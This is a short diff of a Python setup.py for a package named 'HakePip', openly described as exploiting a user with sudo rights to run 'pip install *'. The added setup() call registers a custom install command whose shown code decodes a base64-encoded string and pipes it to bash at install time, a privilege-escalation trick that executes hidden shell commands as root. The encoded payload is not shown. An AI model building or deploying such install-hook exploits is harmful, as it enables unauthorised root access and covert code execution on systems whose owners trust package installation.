@@ -15,4 +15,12 @@ class CustomInstall(install):
     os.system('echo %s|base64 -d|bash' % encoded)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                           
+setup(name='HakePip',
+      version='0.1.1',
+      description='This will exploit a sudoer able to /usr/bin/pip install *',
+      url='https://github.com/0x00-0x00/fakepip',
+      author='HC2023',
+      author_email='andre.marques@esecurity.com.br',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
